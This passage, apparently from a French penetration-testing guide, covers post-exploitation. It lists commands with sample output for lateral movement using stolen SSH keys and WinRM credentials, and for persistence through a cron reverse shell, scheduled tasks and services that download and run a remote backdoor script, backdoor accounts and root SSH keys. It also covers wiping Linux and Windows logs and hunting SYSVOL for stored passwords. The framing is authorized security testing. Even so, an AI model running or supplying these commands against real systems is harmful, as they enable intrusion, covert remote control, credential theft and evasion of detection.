**Analyse :** Ces commandes permettent d'extraire les hachages de mots de passe et, dans certains cas, les mots de passe en clair des systèmes compromis. Sur Linux, le fichier /etc/shadow contient les hachages de mots de passe des utilisateurs. Sur Windows, l'outil Mimikatz peut extraire les hachages NTLM et parfois même les mots de passe en clair directement de la mémoire du système, en exploitant le fait que Windows stocke temporairement ces informations en mémoire.

#### 4. Mouvement latéral

**Commande pour utiliser SSH avec une clé privée récupérée :**
```bash
cat /home/john/.ssh/id_rsa
chmod 600 john_id_rsa
ssh -i john_id_rsa john@192.168.1.20
```

**Sortie typique :**
```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAtDq8G4vkHeOQZKs3H8XmZQHnKJ9Ov7/lVNAKT/6mCBnOkFnUJ1h0
...
HJV4Vk/5N7+RugodcBxZeOTUG8Q/l8MtJg1vUKqGKRrHG0YFwLQ/QGkFwRQMtQAAABFqb2
huQGV4YW1wbGUuY29tAQID
-----END OPENSSH PRIVATE KEY-----

john@192.168.1.20's password: 
Last login: Wed Apr  2 19:45:00 2025 from 192.168.1.10
john@fileserver:~$ id
uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev)
john@fileserver:~$ hostname
fileserver
```

**Commande pour utiliser des identifiants récupérés avec WinRM :**
```powershell
$password = ConvertTo-SecureString "AdminPass2025!" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("WEBSERVER\Administrator", $password)
Enter-PSSession -ComputerName DC01 -Credential $cred
```

**Sortie typique :**
```
[DC01]: PS C:\Users\Administrator\Documents> whoami
webserver\administrator
[DC01]: PS C:\Users\Administrator\Documents> hostname
DC01
[DC01]: PS C:\Users\Administrator\Documents> Get-ADUser -Filter * -Properties * | Select-Object SamAccountName, Enabled, LastLogonDate | Format-Table -AutoSize

SamAccountName Enabled LastLogonDate        
-------------- ------- -------------        
Administrator  True    4/2/2025 7:50:00 PM
Guest          False                        
krbtgt         False                        
john           True    4/2/2025 7:30:00 PM
jane           True    4/2/2025 5:15:00 PM
robert         True    4/1/2025 9:20:00 AM
```

**Analyse :** Ces commandes permettent de se déplacer latéralement dans le réseau en utilisant des identifiants ou des clés récupérés sur les systèmes compromis. La première commande utilise une clé SSH privée récupérée pour se connecter à un autre serveur Linux. La seconde commande utilise des identifiants Windows récupérés pour établir une session PowerShell à distance sur un contrôleur de domaine, permettant ainsi d'accéder à des informations sensibles comme la liste des utilisateurs du domaine.

#### 5. Persistance

**Commande pour créer un utilisateur avec privilèges sur Linux :**
```bash
useradd -m -s /bin/bash -G sudo hacker
echo "hacker:Password123!" | chpasswd
```

**Commande pour créer une tâche cron pour la persistance :**
```bash
echo "*/5 * * * * root bash -c 'bash -i >& /dev/tcp/192.168.1.5/4444 0>&1'" > /etc/cron.d/system_update
chmod 644 /etc/cron.d/system_update
```

**Commande pour créer une porte dérobée SSH :**
```bash
mkdir -p /root/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0Orwbi+Qd45Bkqzcfxe..." >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
```

**Analyse :** Ces commandes permettent d'établir une persistance sur un système Linux compromis. La première commande crée un nouvel utilisateur avec des privilèges sudo. La deuxième commande crée une tâche cron qui établit une connexion inverse vers l'attaquant toutes les 5 minutes. La troisième commande ajoute une clé SSH à l'utilisateur root, permettant à l'attaquant de se connecter directement sans mot de passe.

**Commande pour créer un utilisateur avec privilèges sur Windows :**
```powershell
net user hacker Password123! /add
net localgroup Administrators hacker /add
```

**Commande pour créer une tâche planifiée pour la persistance :**
```powershell
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle hidden -Command `"& {IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.5/backdoor.ps1')}`""
$trigger = New-ScheduledTaskTrigger -AtStartup
$settings = New-ScheduledTaskSettingsSet -Hidden
Register-ScheduledTask -TaskName "SystemUpdate" -Action $action -Trigger $trigger -Settings $settings -User "SYSTEM" -RunLevel Highest
```

**Commande pour créer un service pour la persistance :**
```powershell
sc create PersistenceService binPath= "cmd.exe /c powershell.exe -WindowStyle hidden -Command \"& {IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.5/backdoor.ps1')}\""
sc config PersistenceService start= auto
sc description PersistenceService "Windows Update Service"
```

**Analyse :** Ces commandes permettent d'établir une persistance sur un système Windows compromis. La première commande crée un nouvel utilisateur avec des privilèges d'administrateur. La deuxième commande crée une tâche planifiée qui s'exécute au démarrage du système et télécharge un script malveillant. La troisième commande crée un service Windows qui s'exécute automatiquement au démarrage et télécharge également un script malveillant.

#### 6. Effacement des traces

**Commande pour effacer les journaux sur Linux :**
```bash
echo "" > /var/log/auth.log
echo "" > /var/log/syslog
echo "" > /var/log/apache2/access.log
echo "" > /var/log/apache2/error.log
history -c
```

**Commande pour supprimer les fichiers temporaires :**
```bash
rm -rf /tmp/linpeas.sh
rm -rf /tmp/rootbash
rm -rf /tmp/backup.py
```

**Analyse :** Ces commandes permettent d'effacer les traces de l'intrusion sur un système Linux. La première série de commandes vide les fichiers de journaux système et d'application, tandis que la commande `history -c` efface l'historique des commandes de l'utilisateur actuel. La deuxième série de commandes supprime les fichiers temporaires créés pendant l'attaque.

**Commande pour effacer les journaux d'événements Windows :**
```powershell
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
```

**Commande pour supprimer les fichiers temporaires :**
```powershell
Remove-Item -Path C:\Temp\* -Force -Recurse
Remove-Item -Path $env:TEMP\* -Force -Recurse
Clear-RecycleBin -Force
```

**Commande pour effacer l'historique PowerShell :**
```powershell
Remove-Item (Get-PSReadlineOption).HistorySavePath
```

**Analyse :** Ces commandes permettent d'effacer les traces de l'intrusion sur un système Windows. La première série de commandes efface les journaux d'événements système, de sécurité et d'application. La deuxième série de commandes supprime les fichiers temporaires et vide la corbeille. La troisième commande efface l'historique des commandes PowerShell.

### Conseils pratiques pour la phase de post-exploitation

1. **Priorisez les actions en fonction des objectifs du test** : si l'objectif est de démontrer l'impact d'une compromission, concentrez-vous sur l'extraction de données sensibles ; si l'objectif est d'évaluer la détection, concentrez-vous sur le mouvement latéral et la persistance.

2. **Documentez méticuleusement toutes les actions** effectuées et les informations recueillies, en notant les commandes utilisées, les résultats obtenus et les observations.

3. **Utilisez des techniques qui minimisent l'impact sur les systèmes** cibles, en évitant les actions qui pourraient causer des perturbations ou des dommages.

4. **Respectez strictement le cadre légal** défini dans la lettre d'autorisation du test d'intrusion, en particulier concernant les types d'actions autorisées et les données pouvant être extraites.

5. **Adaptez les techniques de post-exploitation en fonction de l'environnement** : les techniques efficaces dans un environnement Windows peuvent ne pas fonctionner dans un environnement Linux, et vice versa.

6. **Utilisez des outils automatisés pour accélérer la collecte d'informations**, mais vérifiez manuellement les résultats pour éviter les faux positifs et approfondir l'analyse des vulnérabilités détectées.

7. **Créez des sauvegardes ou des snapshots des systèmes critiques** avant d'effectuer des actions potentiellement perturbatrices, si le cadre du test le permet.

8. **Nettoyez après vous** en supprimant les fichiers créés, les utilisateurs ajoutés et les modifications apportées aux systèmes, sauf si le client demande explicitement de les laisser en place pour des tests de détection.

### Adaptation selon le mode opératoire

#### Test interne vs externe

**Test externe :**
- Concentrez-vous sur l'extraction de données accessibles depuis l'extérieur
- Privilégiez les techniques de persistance qui fonctionnent à travers les pare-feu
- Utilisez des canaux de communication chiffrés pour éviter la détection

**Test interne :**
- Exploitez les relations de confiance entre les systèmes internes
- Concentrez-vous sur le mouvement latéral vers des systèmes critiques
- Recherchez des données sensibles sur les partages réseau et les serveurs internes

#### Exemple de commande pour test interne (énumération de partages réseau) :
```powershell
Get-ChildItem -Path \\DC01\SYSVOL -Recurse -Include *.xml,*.ini,*.txt,*.cfg,*.config,*.conf,*.bak,*.backup,*pass*,*cred* -File -ErrorAction SilentlyContinue | Select-Object FullName
```

**Sortie typique :**
```
FullName
--------
\\DC01\SYSVOL\example.com\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml
\\DC01\SYSVOL\example.com\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Preferences\Groups\Groups.xml
\\DC01\SYSVOL\example.com\scripts\old-passwords.txt
\\DC01\SYSVOL\example.com\scripts\backup\admin-credentials.xml
```

**Commande pour examiner un fichier de préférences de groupe contenant des mots de passe :**
```powershell
Get-Content "\\DC01\SYSVOL\example.com\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml"
```

**Sortie typique :**
```xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
  <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="LocalAdmin" image="2" changed="2025-03-01 12:00:00" uid="{59135E46-A146-4F24-8570-6F72FD7C2B46}">
    <Properties action="U" newName="" fullName="Local Administrator" description="Local Administrator Account" cpassword="AQAAANCMnd8BFdERjHoAwE/Cl+sBAAAA/DRWVQuNbUyV7tBwPuC2WQQAAAACAAAAAAAQZgAAAAEAACAAAAD8WUcEDqZQGMJLLhhJWFLvs/vu7/XR5lWTGZPULnQ+fAAAAAAOgAAAAAIAACAAAADfGBF+DUbZTRry3MIpYKvx1YQT9JGSDtJyXNR+zIB0KxAAAAA+4ZFJyy9D84xNVqh3yKcpQAAAANlGzVZQx+JYMN9J95/pm9CVdlKFGqQZhw7TUY45zUYkKoJc1M1X1oZ4QmYDVfY+cDQQfmPj3QsZ0GrLLDfYgmI=" changeLogon="0" noChange="0" neverExpires="1" acctDisabled="0" userName="LocalAdmin"/>
  </User>
</Groups>
```

**Analyse :** Ces commandes permettent d'identifier et d'exploiter des informations sensibles stockées dans les partages réseau internes. La première commande recherche des fichiers potentiellement intéressants dans le partage SYSVOL du contrôleur de domaine, qui est accessible à tous les utilisateurs du domaine. La deuxième commande examine un fichier de préférences de groupe qui contient un mot de passe chiffré (cpassword) pour un compte d'administrateur local. Ce mot de passe peut être déchiffré car Microsoft a publié la clé de chiffrement, ce qui constitue une vulnérabilité bien connue dans les environnements Active Directory.

### Conclusion

La phase de post-exploitation est une étape cruciale du test d'intrusion qui permet d'évaluer l'impact réel d'une compromission et de démontrer les conséquences potentielles d'une attaque réussie. Elle comprend l'élévation de privilèges, l'extraction de données sensibles, le mouvement latéral, l'établissement de persistance et l'effacement des traces.

Une post-exploitation méthodique et documentée fournit des preuves tangibles des risques de sécurité et aide à prioriser les efforts de remédiation. Cependant, il est essentiel de mener cette phase avec prudence et professionnalisme, en respectant strictement le cadre légal défini pour le test d'intrusion et en minimisant les risques de perturbation des systèmes cibles.
